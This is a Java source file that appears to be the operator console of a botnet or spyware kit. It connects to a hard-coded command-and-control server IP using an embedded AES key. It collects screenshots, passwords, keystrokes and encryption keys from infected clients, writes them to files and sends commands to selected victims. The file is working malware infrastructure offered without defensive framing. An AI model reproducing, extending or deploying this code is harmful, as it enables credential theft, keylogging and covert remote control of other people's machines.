package model;

import static model.MessageState.*;

import java.awt.Color;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyAgreement;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import com.sun.org.apache.regexp.internal.RE;

import view.GUI;

public class Server {

  private static final int PORT_NUMBER = 5720;
  // milliseconds to wait before exiting on failure to connect to C&C server
  private static final int EXIT_TIMEOUT = 10000;
  private static final String SERVER_IP = "54.69.185.61";
  private static final String CIPHER_ALGORITHM = "AES";
  private static final String CIPHER_IMPLEMENTATION = "AES/ECB/NoPadding";
  // cipher key length in bytes
  private static final int KEY_LENGTH = 16;

  private static final byte[] RELAY_SERVER_KEY = {0x40, 0x73, (byte)0x8a, (byte)0xc7, (byte)0x8f, 0x0f, (byte)0xd5, (byte)0xef, 0x02, 0x57, (byte)0xb2, (byte)0xe1, (byte)0x9b, (byte)0x83, 0x04, 0x15};

  private final Map<InetAddress, ClientConnection> clientsAndKeys;
  public final Set<InetAddress> selectedClients;

  private Socket s;
  private InputStream in;
  private PrintWriter out;
  private CipherInputStream cin;
  private CipherInputStream cin2;
  private CipherOutputStream cout;
  private String filename;
  private FileOutputStream fos;
  private GUI gui;

  public Server() {
    gui = new GUI(this);
    gui.setVisible(true);
    //    clients = new HashSet<InetAddress>();
    clientsAndKeys = new HashMap<InetAddress, ClientConnection>();
    selectedClients = new HashSet<InetAddress>();

    try {
      consoleMessage("Attempting to connect to the C&C server...", Color.WHITE);
      s = new Socket(InetAddress.getByName(SERVER_IP), PORT_NUMBER);
      //      byte[] keyBytes = new byte[KEY_LENGTH];
      //      //      s.getInputStream().read(keyBytes, 0, 16);
      //
      //      SecretKey key = new SecretKeySpec(keyBytes, CIPHER_ALGORITHM);
      Cipher decrypt;
      decrypt = Cipher.getInstance(CIPHER_IMPLEMENTATION);
      decrypt.init(Cipher.DECRYPT_MODE, new SecretKeySpec(RELAY_SERVER_KEY, CIPHER_ALGORITHM));

      in = s.getInputStream();
      cin2 = new CipherInputStream(in, decrypt);

      out = new PrintWriter(s.getOutputStream(), true);
      consoleMessage("Connected successfully to the C&C server", Color.GREEN);
    } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
      consoleMessage("Could not connect to the C&C server. It may be offline", Color.RED);
      consoleMessage("Exiting program in 10 seconds...", Color.RED);
      new Thread() {
        @Override
        public void run() {
          try {
            sleep(EXIT_TIMEOUT);
          } catch (InterruptedException e) {
            e.printStackTrace();
          }
          System.exit(1);
        };
      }.start();
    }

    new Thread() {
      @Override
      public void run() {
        int character = -1;
        MessageState state = NORMAL;
        int messageType = 0;
        int messageLength = 0;
        int offset = 0;
        int length = 0;
        byte[] bytes = null;
        String toIp = "";
        String fromIp = "";
        byte[] ipList = null;

        try {
          // state machine that handles input from the server
          while (in != null) {
            if (state == NORMAL) {
              if ((character = in.read()) == -1) break;

              if (character != '!') {
                consoleMessage("Protocol error: expecting ! for state NORMAL, got: " + character + " " + (char)character, Color.RED);
              } else {
                state = GETTING_TYPE;
              }
            } else if (state == GETTING_TYPE) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_TO_IP;
              } else if (character >= '0' && character <= '9'){
                messageType *= 10;
                messageType += character - '0';
              } else {
                consoleMessage("Protocol error: expecting 0-9 for state WAITING_FOR_TYPE, got: " + character + " " + (char)character, Color.RED);
              }
            } else if (state == GETTING_TO_IP) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_FROM_IP;
              } else {
                toIp += (char)character;
              }
            } else if (state == GETTING_FROM_IP) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_LENGTH;
              } else {
                fromIp += (char)character;
              }
            } else if (state == GETTING_LENGTH) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                String prefix = "";
                String extension = "";

                if (messageType == 100) { // getting list of IPs
                  state = UPDATING_IPS;
                  ipList = new byte[messageLength];
                } else { // getting data to write to a file
                  switch (messageType) {
                  case 143: 
                    prefix = "screenshot";
                    extension = "png";
                    break;
                  case 144:
                    prefix = "passwords";
                    extension = "txt";
                    break;
                  case 145:
                    prefix = "keystrokes";
                    extension = "txt";
                    break;
                  case 146:
                    prefix = "encryption key";
                    extension = "txt";
                    break;
                  default:
                    System.out.println("OH NO");
                    System.out.println(character + " " + (char)character + " " + messageType);
                    state = null;
                    break;
                  }

                  filename = prefix + " " + toIp + " " + s.getPort() + " " + System.currentTimeMillis() + "." + extension;
                  fos = new FileOutputStream(filename, true);
                  bytes = new byte[messageLength];
                  offset = 0;
                  state = RECEIVING_DATA;
                  cin = clientsAndKeys.get(InetAddress.getByName(toIp)).cin;
                  consoleMessage("Receiving " + prefix + " data from " + toIp, Color.WHITE);
                }
              } else if (character >= '0' && character <= '9'){
                messageLength *= 10;
                messageLength += character - '0';
              } else {
                consoleMessage("Protocol error: expecting 0-9 for state WAITING_FOR_LENGTH, got: " + character + " " + (char)character, Color.RED);
              }
            } else if (state == RECEIVING_DATA) {
              length = cin.read(bytes, offset, messageLength - offset);

              //              for (int i = 0; i < messageLength; ++i) {
              //                System.out.print((char)bytes[i]);
              //              }
              //              System.out.println();

              try {
                fos.write(bytes, offset, length);
              } catch (FileNotFoundException e) {
                e.printStackTrace();
              } catch (IOException e) {
                e.printStackTrace();
              }

              offset += length;
              if (offset >= bytes.length) {
                fos.close();
                consoleMessage("Finished receiving data from " + toIp, Color.WHITE);
                // reset state
                state = NORMAL;
                messageLength = 0;
                messageType = 0;
                toIp = "";
                fromIp = "";
                ipList = null;
              }
            } else if (state == UPDATING_IPS) {
              if (messageLength-- > 0) {
                if ((character = in.read()) == -1) break;
                ipList[ipList.length - messageLength - 1] = (byte)character;
              } else {
                // parse string into (IP address, encryption key) pairs and put them into map
                // protocol is IP:KEYIP:KEYIP:KEY... with no delimiter between separate pairs since
                // the key is of fixed and known length
                clientsAndKeys.clear();

                boolean inKey = false;
                String currentIp = "";
                byte[] currentKey = new byte[KEY_LENGTH];
                int keyCount = KEY_LENGTH;
                for (byte i : ipList) {
                  if (inKey) {
                    if (keyCount-- > 1) {
                      currentKey[KEY_LENGTH - keyCount - 1] = i;
                    } else {
                      currentKey[KEY_LENGTH - keyCount - 1] = i;
                      clientsAndKeys.put(InetAddress.getByName(currentIp), new ClientConnection(new SecretKeySpec(currentKey, CIPHER_ALGORITHM), in, s.getOutputStream(), CIPHER_IMPLEMENTATION));

                      // reset state
                      currentIp = "";
                      keyCount = KEY_LENGTH;
                      inKey = false;
                    }
                  } else {
                    if (i != ':') {
                      currentIp += (char)i;
                    } else {
                      inKey = true;
                    }
                  }
                }

                //                String[] ipStrings = ipList.split(",");
                //                clients.clear();
                //                for (String s : ipStrings) {
                //                  if (s != null && !s.isEmpty()) {
                //                    clients.add(InetAddress.getByName(s));
                //                  }
                //                }

                gui.updateClients(clientsAndKeys.keySet());
                updateSelectedClients();

                // reset state
                state = NORMAL;
                messageLength = 0;
                messageType = 0;
                toIp = "";
                fromIp = "";
                ipList = null;
              }
            } else if (state == null) {
              consoleMessage("Fatal error", Color.RED);
            }
          }
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
    }.start();
  }

  protected void updateSelectedClients() {
    gui.updateSelectedClients();
  }

  protected void numClients(int size) {
    gui.numClients(size);
  }

  public void sendCommand(String command, String data) {
    if (data == null) {
      data = "";
    }

    updateSelectedClients();
    for (InetAddress i : selectedClients) {
      try {
        out.write("!" + command + "!" + i.getHostAddress() + "!" + "" + "!" + data.length() + "!");
        out.flush();

        if (!data.isEmpty()) {
          cout = clientsAndKeys.get(i).cout;
          cout.write(data.getBytes());
          cout.flush();
        }
        System.out.println("!" + command + "!" + i.getHostAddress() + "!" + InetAddress.getLocalHost().getHostAddress() + "!" + data.length() + "!" + data);
      } catch (UnknownHostException e) {
        e.printStackTrace();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  public void consoleMessage(String message, Color color) {
    gui.consoleMessage(message, color);
  }

  public void setGui(GUI gui) {
    this.gui = gui;
  }
}
